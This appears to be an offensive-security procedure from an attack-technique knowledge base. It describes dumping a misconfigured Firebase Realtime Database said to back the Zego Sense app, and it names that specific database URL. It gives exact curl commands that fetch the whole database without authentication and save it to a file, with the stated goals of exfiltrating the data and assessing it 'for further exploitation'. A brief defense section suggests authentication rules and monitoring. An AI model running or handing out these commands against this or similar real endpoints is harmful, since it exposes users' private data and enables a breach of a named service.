---
id: proc-uuid-2
tags:
  - firebase
  - unauthenticated-read
  - data-exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Cloud
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:45.026Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Read-Public-Data-from-Firebase-Database

## Summary

This procedure demonstrates accessing a misconfigured Firebase Realtime Database to read all contents without authentication, exploiting public read rules to steal sensitive data from the Zego Sense app's backend.

## Description

The Firebase database at https://api-project-615509201590.firebaseio.com has security rules set to allow unauthenticated reads, making all data publicly accessible via the .json endpoint. Attackers can use a web browser or HTTP client to fetch the entire database structure in JSON format. This targets cloud services integrated with mobile apps where misconfigurations expose user data. Prerequisites: The extracted Firebase URL. Expected outcomes: Full data dump, potentially including user information, leading to breaches.

## Requirements

1. Extracted Firebase URL
2. Web browser or HTTP client (e.g., curl)
3. Internet access

## Defense

Defensive measures and detection strategies:

- Configure Firebase security rules to require authentication for reads
- Enable Firebase Authentication and integrate with app login flows
- Log and monitor access to database endpoints for unauthorized queries

## Objectives

1. Confirm public read access
2. Exfiltrate database contents
3. Assess data sensitivity for further exploitation

## Instructions

### Step 1: Access the Database Endpoint

**Context**: Directly query the Firebase root to retrieve public data.

Use a browser or curl to hit the .json endpoint.

**Command** ([[curl-get-firebase]]):

```bash
curl https://api-project-615509201590.firebaseio.com/.json
```

> This returns the database JSON without auth. Expected output: Raw JSON data structure.

### Step 2: Parse and Analyze Response

**Context**: Review the fetched data for sensitive information.

Save the output to a file and inspect:

```bash
curl https://api-project-615509201590.firebaseio.com/.json > firebase_data.json
cat firebase_data.json
```

> Expected output: Readable JSON with app data, confirming exposure.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[curl-get-firebase]]

## Tools Used


## Tags

- firebase
- unauthenticated-read
- data-exfiltration
